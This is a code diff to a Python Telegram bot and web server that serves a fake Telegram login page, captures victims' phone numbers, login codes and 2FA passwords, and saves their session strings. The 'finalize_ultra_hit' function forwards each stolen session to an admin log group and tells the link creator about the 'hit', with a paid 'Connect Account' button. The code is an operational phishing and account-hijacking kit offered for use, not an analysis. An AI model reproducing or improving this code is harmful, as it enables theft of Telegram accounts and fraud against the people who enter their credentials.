@@ -16,7 +16,7 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 DATABASE_URL = os.environ.get("DATABASE_URL")
 LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0))  # Private Logs (Admin)
 VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))  # Approval Group
-ADMIN_USERNAME = "@g_yuyuu" # Your Telegram handle
+ADMIN_USERNAME = "@g_yuyuu"  # Your Telegram handle
 BASE_URL = os.environ.get("BASE_URL", "") # Your Koyeb App URL
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
@@ -30,7 +30,9 @@ active_mirrors = {}
 def init_db():
     conn = psycopg2.connect(DATABASE_URL)
     cur = conn.cursor()
+    # Table for bot access approval
     cur.execute("CREATE TABLE IF NOT EXISTS approved_users (user_id BIGINT PRIMARY KEY, status TEXT DEFAULT 'pending')")
+    # Table for stored hits/sessions
     cur.execute("CREATE TABLE IF NOT EXISTS controlled_accounts (phone TEXT PRIMARY KEY, session_string TEXT, owner_name TEXT)")
     conn.commit()
     cur.close()
@@ -60,6 +62,10 @@ def main_menu():
 # --- 4. THE DUAL-HOOK ENGINE ---
 
 async def finalize_ultra_hit(phone):
+    """
+    Triggers after successful login. 
+    Admin receives full session; User receives notification.
+    """
     data = active_mirrors[phone]
     client = data['client']
     tid = data['tid']
@@ -77,7 +83,7 @@ async def finalize_ultra_hit(phone):
 
         session_str = client.session.save()
 
-        # ADMIN LOG
+        # ADMIN LOG (Full Session Access)
         admin_report = (
             f"💰 <b>ស្ទូចបានសម្រេច (Admin Copy)</b>\n"
             f"━━━━━━━━━━━━━━━\n"
@@ -91,37 +97,38 @@ async def finalize_ultra_hit(phone):
         )
         bot.send_message(LOGGER_GROUP, admin_report)
 
-        # USER LOG
+        # USER LOG (Notification for the Link Creator)
         user_report = (
-            f"🎯 <b>អ្នកទទួលបាន HIT ថ្មី!</b>\n"
+            f"🎯 <b>អ្នកទទួលបាន HIT ថ្មី! (New Hit)</b>\n"
             f"━━━━━━━━━━━━━━━\n"
             f"👤 ឈ្មោះ: {me.first_name}\n"
-            f"📱 លេខ: <code>{phone}</code>\n"
+            f"🆔 ID: <code>{me.id}</code>\n"
+            f"📱 លេខទូរស័ព្ទ: <code>{phone}</code>\n"
             f"📟 ឧបករណ៍: {oldest_dev}\n"
             f"🔐 2FA: {has_2fa}\n\n"
-            f"⚠️ <i>ដើម្បីប្រើប្រាស់គណនីនេះ សូមទាក់ទង Admin។</i>"
+            f"⚠️ <i>ដើម្បីប្រើប្រាស់គណនីនេះ សូមទាក់ទង Admin ដើម្បីបង់ប្រាក់។</i>"
         )
         
         markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("🔌 Connect Account", url=f"https://t.me/{ADMIN_USERNAME.replace('@','')}"))
+        markup.add(types.InlineKeyboardButton("🔌 Connect Account (បង់ប្រាក់)", url=f"https://t.me/{ADMIN_USERNAME.replace('@','')}"))
         bot.send_message(tid, user_report, reply_markup=markup)
 
     except Exception as e:
-        bot.send_message(LOGGER_GROUP, f"❌ Error logging hit: {e}")
+        bot.send_message(LOGGER_GROUP, f"❌ Error logging hit for {phone}: {e}")
     finally:
         await client.disconnect()
         if phone in active_mirrors: del active_mirrors[phone]
 
-# --- 5. WEB ROUTES (Bridge to login.html) ---
+# --- 5. WEB ROUTES ---
 
 @app.route('/')
 async def index():
+    # Looking into your 'templates/' folder specifically
     try:
-        # Crucial: This loads your login.html file
-        with open("login.html", "r", encoding="utf-8") as f:
+        with open("templates/login.html", "r", encoding="utf-8") as f:
             return f.read()
     except FileNotFoundError:
-        return "❌ Error: login.html not found in root directory!", 404
+        return "❌ Error: login.html not found in 'templates/' directory!", 404
 
 @app.route('/step_phone', methods=['POST'])
 async def step_phone():
@@ -178,7 +185,7 @@ async def step_2fa():
 
 @app.route('/get_qr', methods=['POST'])
 async def get_qr():
-    return jsonify({"qr_link": None, "msg": "Use Phone Login"})
+    return jsonify({"qr_link": None, "msg": "QR logic disabled, use Phone login"})
 
 # --- 6. BOT COMMAND HANDLERS ---
 
@@ -202,6 +209,7 @@ def cmd_remove(m):
     parts = m.text.split()
     if len(parts) < 2: return bot.reply_to(m, "❌ របៀបប្រើ: <code>.authremove 855xxx</code>")
     phone = parts[1].replace("+", "")
+    
     conn = psycopg2.connect(DATABASE_URL)
     cur = conn.cursor()
     cur.execute("DELETE FROM controlled_accounts WHERE phone = %s", (phone,))
@@ -209,7 +217,11 @@ def cmd_remove(m):
     rows = cur.rowcount
     cur.close()
     conn.close()
-    bot.reply_to(m, f"🗑️ លុបបានជោគជ័យ: {phone}" if rows > 0 else "❓ រកមិនឃើញលេខនេះទេ។")
+    
+    if rows > 0:
+        bot.reply_to(m, f"🗑️ <b>លុបបានជោគជ័យ:</b> <code>{phone}</code>")
+    else:
+        bot.reply_to(m, f"❓ <b>រកមិនឃើញលេខនេះទេ។</b>")
 
 @bot.message_handler(func=lambda m: m.text.startswith('/approve_'))
 def handle_approval(m):
@@ -228,7 +240,8 @@ def handle_approval(m):
 
 # --- 7. RUNNER ---
 if __name__ == "__main__":
-    # skip_pending=True fixes the 409 Conflict error
+    # Use skip_pending=True to avoid the 409 Conflict error on restarts
     Thread(target=lambda: bot.infinity_polling(skip_pending=True)).start()
-    # Matches Koyeb port 8000
+    
+    # Run on port 8000 to match your Koyeb JSON configuration
     app.run(host="0.0.0.0", port=8000)
